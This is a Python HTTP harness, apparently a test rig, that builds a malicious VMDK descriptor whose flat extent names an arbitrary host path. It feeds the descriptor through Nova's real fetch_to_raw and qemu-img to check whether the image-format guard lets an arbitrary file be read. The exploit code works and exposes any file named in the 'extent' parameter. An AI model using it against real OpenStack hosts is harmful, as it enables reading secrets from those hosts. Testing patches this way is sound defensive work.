# -*- coding: utf-8 -*-
"""Thin HTTP consumer over the installed OpenStack Nova package.

GET /read?claim=<disk_format>&extent=<abs-path>
  Crafts a monolithicFlat VMDK whose FLAT extent names <extent>, then runs the
  real nova.virt.images.fetch_to_raw() from the pip-installed nova tree with
  Glance-claimed disk_format=<claim>. If the gate does not reject the image,
  qemu-img (the genuine convert sink) consumes the delivered bytes and the
  response body carries the canary planted at /canary/secret.txt.

GET /healthz -> {"status":"ok"} plus the installed nova module paths.
"""
import json
import os
import subprocess
import tempfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

# Installed nova tree (site-packages), not /app/images.py stubs.
import nova
from nova import conf as nova_conf
from nova import exception
from nova.virt import images

VERSION = os.environ.get("PCB_VERSION", "v?")
CANARY_PATH = os.environ.get("CANARY_PATH", "/canary/secret.txt")
STATE = {"claim": "raw"}


def _override(name, value, group=None):
    try:
        if group:
            nova_conf.CONF.set_override(name, value, group=group)
        else:
            nova_conf.CONF.set_override(name, value)
    except Exception:
        pass


def _configure_nova():
    _override("force_raw_images", True)
    _override("instances_path", tempfile.gettempdir())
    _override(
        "vmdk_allowed_types",
        ["streamOptimized", "monolithicSparse"],
        group="compute",
    )
    _override("disable_deep_image_inspection", False, group="workarounds")


class _GlanceFeed:
    """Edge stand-in for Glance: claimed disk_format + deliver local bytes.

    fetch_to_raw still runs the real images.py gate / qemu-img path; only the
    Glance client RPC is replaced so the crafted VMDK is the downloaded image.
    """

    def get(self, context, image_href, **kw):
        return {"disk_format": STATE["claim"]}

    def download(self, context, image_href, dest_path=None, trusted_certs=None, **kw):
        with open(image_href, "rb") as src, open(dest_path, "wb") as dst:
            dst.write(src.read())


def _qemu_convert(source, dest):
    subprocess.check_output(
        ["qemu-img", "convert", "-O", "raw", "--", source, dest],
        stderr=subprocess.STDOUT,
    )


def build_malicious_vmdk(workdir, extent_path):
    desc = (
        "# Disk DescriptorFile\n"
        "version=1\n"
        "CID=fffffffe\n"
        "parentCID=ffffffff\n"
        'createType="monolithicFlat"\n'
        "\n"
        "# Extent description\n"
        'RW 1 FLAT "%s" 0\n'
        "\n"
        "# The Disk Data Base\n"
        "#DDB\n"
        'ddb.virtualHWVersion = "4"\n'
        'ddb.geometry.cylinders = "2"\n'
        'ddb.geometry.heads = "16"\n'
        'ddb.geometry.sectors = "63"\n'
        'ddb.adapterType = "ide"\n'
    ) % extent_path
    path = os.path.join(workdir, "mal.vmdk")
    with open(path, "w") as f:
        f.write(desc)
    return path


def attempt(claim, extent_path):
    workdir = tempfile.mkdtemp(prefix="pcb_")
    mal = build_malicious_vmdk(workdir, extent_path)
    out_path = os.path.join(workdir, "img.raw")
    STATE["claim"] = claim
    try:
        images.fetch_to_raw(None, mal, out_path)
    except exception.ImageUnacceptable as e:
        return {
            "claim": claim,
            "allowed": False,
            "body": "BLOCKED_BY_GUARD",
            "reason": getattr(e, "reason", str(e)),
        }
    except Exception as e:
        return {
            "claim": claim,
            "allowed": False,
            "body": "BLOCKED_BY_GUARD",
            "reason": repr(e),
        }
    delivered = out_path if os.path.exists(out_path) else mal
    disc = os.path.join(workdir, "disc.raw")
    try:
        _qemu_convert(delivered, disc)
        with open(disc, "rb") as f:
            body = f.read().decode("utf-8", "replace")
    except Exception as e:
        body = "READ_ERROR:%r" % (e,)
    return {"claim": claim, "allowed": True, "body": body}


def _identity():
    fi = None
    try:
        from nova.image import format_inspector as _fi
        fi = getattr(_fi, "__file__", None)
    except Exception:
        fi = None
    return {
        "status": "ok",
        "version": VERSION,
        "nova": getattr(nova, "__file__", None),
        "images": getattr(images, "__file__", None),
        "format_inspector": fi,
    }


class Handler(BaseHTTPRequestHandler):
    def _send(self, code, obj):
        body = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        u = urlparse(self.path)
        if u.path in ("/", "/healthz"):
            self._send(200, _identity())
            return
        if u.path == "/read":
            q = parse_qs(u.query)
            claim = (q.get("claim") or ["raw"])[0]
            extent = (q.get("extent") or [CANARY_PATH])[0]
            try:
                res = attempt(claim, extent)
            except Exception as e:  # pragma: no cover
                res = {"claim": claim, "allowed": False, "body": "HARNESS_ERROR:%r" % (e,)}
            res["version"] = VERSION
            self._send(200, res)
            return
        self._send(404, {"error": "not found"})

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    _configure_nova()
    images.IMAGE_API = _GlanceFeed()
    port = int(os.environ.get("PORT", "8080"))
    ThreadingHTTPServer(("0.0.0.0", port), Handler).serve_forever()
